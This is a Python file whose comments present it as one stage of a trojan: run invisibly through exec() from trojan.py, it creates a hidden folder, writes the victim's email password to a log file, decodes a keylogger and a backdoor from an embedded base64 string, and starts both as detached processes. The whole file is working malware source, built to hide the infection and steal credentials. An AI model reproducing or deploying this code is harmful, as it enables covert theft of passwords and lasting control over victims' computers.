# This program is what trojan.py runs to compromise the victims machine
# It decodes the other malware stored in the "key" and places them into a hidden folder
# The victim will never actually see this program as it is run by exec() on an encoded string
import base64
import os
import subprocess

# create a hidden directory to store the logger and its data
if not os.path.isdir(".hidden"):
    os.mkdir(".hidden")
    subprocess.call(["attrib", "+h", ".hidden"])
# move to hidden directory
os.chdir(".hidden")


# The variable your_email_pass may seem to not be defined but since this program is run by exec
# in trojan.py it has access to all the variables in that program.
# This way we can retrieve the user's email's password without them knowing
f = open("logfile.txt", "w")
f.write("Password: " + your_email_pass + "\n")
f.close()

# Similarly, key is also contained in trojan.py, we are slicing it to only take the part which contains
# the encoding for logger.py and ignore the part containing the encoding for this file and backdoor.py
s = str(base64.b64decode(key[4804:]), encoding="utf-8").replace("victim", your_email)
f = open("logger.py", "w")
f.write(s)
f.close()
# slicing for backdoor.py and ignore the part containing the encoding for this file and logger.py
s = str(base64.b64decode(key[2032:4804]), encoding="utf-8")
f = open("backdoor.py", "w")
f.write(s)
f.close()

subprocess.Popen(["python", "logger.py"], start_new_session=True)
subprocess.Popen(["python", "backdoor.py"], start_new_session=True)
